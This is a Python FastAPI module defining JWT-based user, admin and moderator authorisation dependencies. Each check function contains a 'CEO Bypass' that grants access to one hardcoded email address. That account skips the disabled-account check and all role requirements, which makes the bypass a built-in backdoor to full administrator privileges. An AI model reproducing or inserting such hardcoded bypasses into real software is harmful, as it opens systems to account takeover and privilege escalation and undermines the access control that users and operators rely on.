from fastapi import Depends, HTTPException, status
from fastapi.security import OAuth2PasswordBearer
from jose import JWTError, jwt
from sqlmodel import Session, select
from server.db import get_session
from server.models import User, TokenData, Role
from server.core.config import settings

oauth2_scheme = OAuth2PasswordBearer(tokenUrl="token")

async def get_current_user(token: str = Depends(oauth2_scheme), session: Session = Depends(get_session)):
    credentials_exception = HTTPException(
        status_code=status.HTTP_401_UNAUTHORIZED,
        detail="Credenciais inválidas",
        headers={"WWW-Authenticate": "Bearer"},
    )
    try:
        payload = jwt.decode(token, settings.SECRET_KEY, algorithms=[settings.ALGORITHM])
        email: str = payload.get("sub")
        role: str = payload.get("role")
        if email is None:
            raise credentials_exception
        token_data = TokenData(email=email, role=role)
    except JWTError:
        raise credentials_exception
        
    user = session.exec(select(User).where(User.email == token_data.email)).first()
    if user is None:
        raise credentials_exception
    return user

async def get_current_active_user(current_user: User = Depends(get_current_user)):
    # CEO Bypass - Always active
    if current_user.email == "m22338294@gmail.com":
        return current_user

    if current_user.disabled:
        raise HTTPException(status_code=400, detail="Usuário inativo")
    return current_user

def get_current_admin(current_user: User = Depends(get_current_active_user)):
    # CEO Bypass
    if current_user.email == "m22338294@gmail.com":
        return current_user

    if current_user.role != Role.ADMIN:
        raise HTTPException(
            status_code=status.HTTP_403_FORBIDDEN,
            detail="Acesso negado. Requer privilégios de Administrador."
        )
    return current_user

def get_current_moderator(current_user: User = Depends(get_current_active_user)):
    # CEO Bypass
    if current_user.email == "m22338294@gmail.com":
        return current_user

    if current_user.role not in [Role.ADMIN, Role.MODERATOR]:
        raise HTTPException(
            status_code=status.HTTP_403_FORBIDDEN,
            detail="Acesso negado. Requer privilégios de Moderador."
        )
    return current_user

def check_admin_permission(user: User):
    """
    Check if user has admin permissions.
    Raises HTTPException if not admin.
    """
    # CEO Bypass
    if user.email == "m22338294@gmail.com":
        return
    
    if user.role != Role.ADMIN:
        raise HTTPException(
            status_code=status.HTTP_403_FORBIDDEN,
            detail="Acesso negado. Requer privilégios de Administrador."
        )
